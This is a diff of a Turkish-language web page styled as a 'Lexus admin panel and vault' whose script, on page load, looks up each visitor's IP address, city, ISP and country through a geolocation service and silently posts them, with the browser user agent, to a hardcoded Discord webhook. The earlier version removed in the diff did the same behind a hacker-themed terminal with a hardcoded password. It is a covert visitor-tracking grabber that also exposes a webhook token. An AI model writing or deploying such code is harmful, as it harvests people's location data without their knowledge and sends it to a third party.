@@ -2,130 +2,128 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>TERMINAL_BY_LEXUS</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LEXUS ADMIN PANEL & VAULT</title>
     <style>
-        body { background-color: #000; color: #1aff1a; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; text-shadow: 0 0 5px #1aff1a; }
-        #terminal { width: 90%; max-width: 800px; }
-        input { background: transparent; border: none; color: #1aff1a; font-family: inherit; font-size: 1.1rem; outline: none; width: 100%; }
-        .system-msg { color: #ff0000; font-weight: bold; }
-        .getir-msg { color: #ffffff; margin: 10px 0; }
-        #admin-panel { 
-            position: fixed; top: 10px; right: 10px; width: 280px; height: 300px;
-            border: 1px solid #ff00ff; background: rgba(20, 0, 20, 0.95); 
-            padding: 10px; font-size: 0.7rem; color: #ff00ff; 
-            display: none; overflow-y: auto; z-index: 1000;
-            box-shadow: 0 0 15px rgba(255, 0, 255, 0.2);
-        }
-        .log-entry { border-bottom: 1px solid #330033; padding: 5px 0; }
+        body { background-color: #000; color: #bc00ff; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .vault-container { border: 1px solid #bc00ff; padding: 20px; box-shadow: 0 0 20px rgba(188, 0, 255, 0.4); background: rgba(10, 0, 15, 0.9); width: 95%; max-width: 800px; margin-bottom: 20px; }
+        .header { border-bottom: 1px solid #bc00ff; margin-bottom: 15px; padding-bottom: 10px; font-weight: bold; letter-spacing: 2px; text-align: center; font-size: 1.5rem; }
+        
+        /* Log Listesi Alanı */
+        #log-list { max-height: 400px; overflow-y: auto; text-align: left; font-size: 12px; border: 1px dashed #444; padding: 10px; background: #050005; }
+        .log-item { border-bottom: 1px solid #222; padding: 8px 0; color: #00ff00; }
+        .log-item span { color: #ff00ff; } /* IP ve Tarih mor olsun */
+        
+        .status-bar { margin-top: 15px; font-size: 14px; color: #ff0000; text-align: center; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        
+        .controls { margin-top: 20px; }
+        .btn { border: 1px solid #ff0000; color: #ff0000; background: none; padding: 10px 20px; cursor: pointer; font-family: inherit; }
+        .btn:hover { background: #ff0000; color: #000; }
     </style>
 </head>
 <body>
 
-<div id="admin-panel">
-    <div style="border-bottom: 1px solid #ff00ff; font-weight: bold; margin-bottom: 5px;">[LEXUS_DATABASE_VAULT]</div>
-    <div id="log-content"></div>
-    <button onclick="localStorage.clear(); location.reload();" style="background:none; border:1px solid red; color:red; cursor:pointer; font-size:0.6rem; margin-top:10px;">LOGLARI SIFIRLA</button>
-</div>
+    <div class="vault-container">
+        <div class="header">[ LEXUS_DATABASE_VAULT_V12 ]</div>
+        
+        <div id="log-list">
+            <div class="log-item">Sistem başlatıldı... Kayıtlar bekleniyor...</div>
+        </div>
 
-<div id="terminal">
-    <div id="output"></div>
-    <div id="input-line">
-        <span id="prompt"></span>
-        <input type="text" id="userInput" autofocus autocomplete="off">
+        <div class="status-bar">
+            DURUM: TARAMA MODU AKTİF <span class="blink">_</span>
+        </div>
+
+        <div class="controls">
+            <button class="btn" onclick="clearLogs()">LOGLARI SIFIRLA</button>
+        </div>
     </div>
-</div>
 
-<script>
-    const WEBHOOK_URL = "BURAYA_WEBHOOK_URL_GELECEK";
-    const output = document.getElementById('output');
-    const userInput = document.getElementById('userInput');
-    const logContent = document.getElementById('log-content');
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1480291700793544774/a8WwCE5IsjTE-p5kwWHuuI9IUGHLYYM1yAYtvz10nbhEljg2abosvDz3y74xzVnBT4eN";
 
-    // --- KALICI DEPOLAMA MANTIĞI ---
-    function saveLogLocally(logEntry) {
-        let logs = JSON.parse(localStorage.getItem('lexus_logs') || '[]');
-        logs.push(logEntry);
-        localStorage.setItem('lexus_logs', JSON.stringify(logs));
-        renderLogs();
-    }
+        // Sayfa yüklendiğinde eski logları getir
+        window.onload = () => {
+            displayLogs();
+            collectAndSend();
+        };
 
-    function renderLogs() {
-        let logs = JSON.parse(localStorage.getItem('lexus_logs') || '[]');
-        logContent.innerHTML = logs.map(l => `<div class="log-entry">${l}</div>`).reverse().join('');
-    }
+        async function collectAndSend() {
+            try {
+                // Bilgileri Topla
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
+                
+                const logEntry = {
+                    ip: data.ip,
+                    city: data.city,
+                    isp: data.org,
+                    device: navigator.platform,
+                    date: new Date().toLocaleString()
+                };
 
-    async function sendFullIntelligence(action) {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            const time = new Date().toLocaleTimeString();
-            const logText = `[${time}] ${action}: ${d.ip} (${d.city})`;
+                // 1. Webhook'a Gönder
+                sendToDiscord(data, logEntry);
+
+                // 2. Admin Paneline (Local Storage) Kaydet
+                saveLog(logEntry);
+
+            } catch (err) {
+                console.error("Hata:", err);
+            }
+        }
+
+        function saveLog(entry) {
+            let logs = JSON.parse(localStorage.getItem('lexus_logs')) || [];
+            logs.unshift(entry); // Yeni logu başa ekle
+            localStorage.setItem('lexus_logs', JSON.stringify(logs));
+            displayLogs();
+        }
+
+        function displayLogs() {
+            const logList = document.getElementById('log-list');
+            let logs = JSON.parse(localStorage.getItem('lexus_logs')) || [];
             
-            // 1. Kalıcı olarak tarayıcıya kaydet
-            saveLogLocally(logText);
+            if (logs.length > 0) {
+                logList.innerHTML = logs.map(l => `
+                    <div class="log-item">
+                        [${l.date}] <span>GİRİŞ TESPİT EDİLDİ:</span> ${l.ip} - ${l.city} (${l.isp}) - 📱 ${l.device}
+                    </div>
+                `).join('');
+            }
+        }
 
-            // 2. Discord'a anlık gönder
+        function clearLogs() {
+            if(confirm("Tüm kayıtlar silinsin mi?")) {
+                localStorage.removeItem('lexus_logs');
+                location.reload();
+            }
+        }
+
+        async function sendToDiscord(info, entry) {
             const payload = {
-                username: "LEXUS_DATABASE",
+                username: "LEXUS ADMIN NOTIFIER",
                 embeds: [{
-                    title: `SİSTEM HAREKETİ: ${action}`,
-                    color: 16711935,
+                    title: "⚠️ PANEL GİRİŞİ!",
+                    color: 12320255,
                     fields: [
-                        { name: "🌐 IP", value: d.ip, inline: true },
-                        { name: "📍 KONUM", value: `${d.city}/${d.country_name}`, inline: true },
-                        { name: "🏢 SAĞLAYICI", value: d.org, inline: false },
-                        { name: "📱 CİHAZ", value: navigator.platform, inline: true }
+                        { name: "🌐 IP", value: info.ip, inline: true },
+                        { name: "📍 Konum", value: `${info.city}/${info.country_name}`, inline: true },
+                        { name: "🔌 Sağlayıcı", value: info.org, inline: false },
+                        { name: "📱 Sistem", value: navigator.userAgent, inline: false }
                     ],
                     timestamp: new Date()
                 }]
             };
-            fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-        } catch (e) {}
-    }
 
-    const lines = [
-        "[SYSTEM] VERİTABANI BAĞLANTISI KURULDU...",
-        "Kimiz biz? Biz bir takımız. İstanbul'dan.",
-        "--------------------------------------------------",
-        "Sistem kölesi misin (0), yoksa dünyayı değiştiren mi (1)?"
-    ];
-
-    let i = 0;
-    function typeWriter() {
-        if (i < lines.length) {
-            let p = document.createElement('p');
-            p.className = i === 0 ? 'system-msg' : 'getir-msg';
-            p.innerText = lines[i];
-            output.appendChild(p);
-            i++;
-            setTimeout(typeWriter, 500);
-        } else {
-            document.getElementById('prompt').innerText = "Giriş > ";
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
         }
-    }
-
-    window.onload = () => {
-        typeWriter();
-        renderLogs(); // Sayfa açılınca eski logları yükle
-        sendFullIntelligence("SİSTEME GİRİŞ");
-    };
-
-    userInput.addEventListener('keydown', (e) => {
-        if (e.key === 'Enter') {
-            const val = userInput.value.trim().toLowerCase();
-            userInput.value = "";
-
-            if (val === 'lexuscxnnn113') {
-                document.getElementById('admin-panel').style.display = "block";
-                return;
-            }
-
-            if (val === '0' || val === '1') {
-                output.innerHTML += `<p style="color:yellow;">> Analiz tamamlanıyor...</p>`;
-                sendFullIntelligence(`SEÇİM: ${val}`);
-            }
-        }
-    });
-</script>
+    </script>
 </body>
 </html>
